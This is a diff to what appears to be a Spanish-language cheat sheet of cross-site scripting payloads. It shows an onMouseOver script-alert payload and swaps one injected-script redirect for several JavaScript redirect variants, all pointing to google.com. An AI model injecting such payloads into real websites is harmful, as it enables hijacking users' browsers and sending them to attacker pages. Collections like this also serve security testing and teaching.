@@ -107,7 +107,14 @@ onMouseOver=<script>alert("/XSS BY Y000!/")</script>
 
 ### redirección 
 
-`"><script>document.location="http://google.com";</script>`
+```
+location="http://google.com"
+document.location = "http://google.com"
+document.location.href="http://google.com"
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
+
+```
 
 
 ### JavaScript
